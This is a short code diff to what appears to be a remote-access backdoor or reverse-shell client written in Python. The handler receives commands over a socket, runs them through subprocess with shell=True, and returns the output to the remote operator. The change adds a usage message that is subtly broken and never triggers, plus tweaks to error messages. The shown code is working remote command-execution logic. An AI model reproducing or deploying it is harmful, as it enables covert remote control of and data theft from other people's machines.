@@ -72,17 +72,20 @@ Processor Architecture: {platform.processor()}
             break
 
         elif cmd.split(" ")[0] == "shell":
-            comm = subprocess.Popen(str(cmd.split(cmd.split(" ")[0])[1].strip()), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            STDOUT, STDERR = comm.communicate()
-            if not STDOUT:
-                sock.send(STDERR)
+            if len(cmd) < 2:
+                sock.send("Usage: shell <command>".encode())
             else:
-                sock.send(STDOUT)
+                comm = subprocess.Popen(str(cmd.split(cmd.split(" ")[0])[1].strip()), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                STDOUT, STDERR = comm.communicate()
+                if not STDOUT:
+                    sock.send(STDERR)
+                else:
+                    sock.send(STDOUT)
         else:
-            sock.send("Unrecognized command!".encode())
+            sock.send((E+"Unrecognized command!").encode())
 
         if not cmd:
             break
     except Exception as e:
-        sock.send("An error has occured: {}".format(str(e)).encode())
+        sock.send((E+"An error has occured: {}".format(str(e))).encode())
 sock.close()
